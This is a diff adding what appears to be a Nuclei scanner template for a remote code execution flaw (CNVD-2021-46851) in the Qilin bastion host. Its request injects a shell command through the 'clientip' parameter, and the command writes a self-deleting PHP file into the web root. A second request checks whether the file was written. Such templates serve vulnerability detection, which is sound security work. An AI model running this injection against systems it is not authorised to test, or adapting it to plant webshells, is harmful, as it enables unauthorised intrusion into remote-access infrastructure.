@@ -1,0 +1,31 @@
+id: CNVD-2021-46851
+
+info:
+  name: Qilin Bastion Host - Remote Code Execution
+  author: qwtd
+  severity: critical
+  description: |
+    Exploitation of remote code execution in Qilin Bastion Host.
+  reference:
+    - https://yun.scdsjzx.cn/system/notice/detail/399d2dd0-94aa-4914-a8f6-e71f8dc8ac87
+  tags: 中远麒麟堡垒机
+
+variables:
+  random_string: "{{to_lower(rand_base(10))}}"
+
+http:
+  - raw:
+      - |
+        GET /get_luser_by_sshport.php?clientip=1;echo "<?php echo md5('{{random_string}}');unlink(__FILE__);?>">/opt/freesvr/web/htdocs/freesvr/audit/{{random_string}}.php;&clientport=1 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{random_string}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200 && contains(body_2, "{{md5(random_string)}}")'
+        condition: and
